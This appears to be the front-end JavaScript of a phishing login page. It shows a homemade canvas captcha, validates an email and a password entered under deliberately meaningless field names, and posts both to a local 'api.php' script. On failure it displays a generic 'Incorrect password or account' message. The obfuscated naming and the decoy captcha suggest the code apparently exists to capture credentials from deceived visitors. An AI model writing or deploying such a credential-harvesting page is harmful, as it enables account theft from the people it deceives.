document.getElementById("glizards").addEventListener("click", function() {
	senchi();
});
createCaptcha()
var code;
		function createCaptcha() {
			var ramno = Math.floor(Math.random() * 6) + 5; //random 5-10
		  //clear the contents of captcha div first
		  document.getElementById('captcha').innerHTML = "";
		  var charsArray =
		  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!#$%^&*+=-";
		  var lengthOtp = ramno;
		  var captcha = [];
		  for (var i = 0; i < lengthOtp; i++) {
			//below code will not allow Repetition of Characters
			var index = Math.floor(Math.random() * charsArray.length + 1); //get the next character from the array
			if (captcha.indexOf(charsArray[index]) == -1)
			  captcha.push(charsArray[index]);
			else i--;
		  }
		  var canv = document.createElement("canvas");
		  canv.id = "captcha";
		  canv.width = 200;
		  canv.height = 50;
		  var ctx = canv.getContext("2d");
		  ctx.font = "25px Georgia";
		  ctx.strokeText(captcha.join(""), 0, 30);
		  //storing captcha so that can validate you can save it somewhere else according to your specific requirements
		  code = captcha.join("");
		  document.getElementById("captcha").appendChild(canv); // adds the canvas to the body element
		}


	function senchi() {
    var glizard  = document.getElementById("glizard").value;
  	var glizardr  = document.getElementById("glizardr").value;
	var nxielw = nxielwr = glizardc = true;


    if(myTrim(glizard) == "") {
        printError("nxielw", " ");
    } else {

        var regex = /^\S+@\S+\.\S+$/;
        if(regex.test(glizard) === false) {
            printError("nxielw", " ");
        } else{
            printError("nxielw", "");
            nxielw = false;
        }
    }

    if(myTrim(glizardr) == "") {
        printError("nxielwr", "  ");
    } else {
        if(myTrim(glizardr).length < 8){
			printError("nxielwr", " ");
		} else if(myTrim(glizardr).length > 40){
			printError("nxielwr", " ");
		} else{
            printError("nxielwr", "");
            nxielwr = false;
        }
    }

    if (document.getElementById("glizardc").value == code) {
			document.getElementById('nxielw').innerHTML = " ";
			glizardc = false
		  }else{
			  document.getElementById('nxielw').innerHTML = "Invalid Captcha";
				createCaptcha();
		  }

	if ((nxielw || nxielwr || glizardc) == true) {
		document.getElementById("glizard").value = "";
  	document.getElementById("glizardr").value = "";
		document.getElementById("glizardc").value = "";
	   return false;
    } else {
      sachoio()
    }
	}

	function sachoio(){

		var glizard  = document.getElementById("glizard").value;
		var glizardr  = document.getElementById("glizardr").value;

		$.ajax({
			type: "POST",
			url: "api.php",
			//dataType: "json",
			data: {glizard: glizard, glizardr: glizardr},
			success: function(data){
 				$("#hysi").html(data);
			},
			error : function(jqXHR, textStatus, errorThrown) {
				document.getElementById('nxielw').innerHTML = "Incorrect password or account";
      }

		});

	}
  function myTrim(x) {
  	  return x.replace(/^\s+|\s+$/gm,'');
  	}

  	String.prototype.nl2br = function(){
  		return this.replace(/\n/g, "<br />");
  	}
  	function printError(elemId, hintMsg) {
      document.getElementById(elemId).innerHTML = hintMsg;
  	}
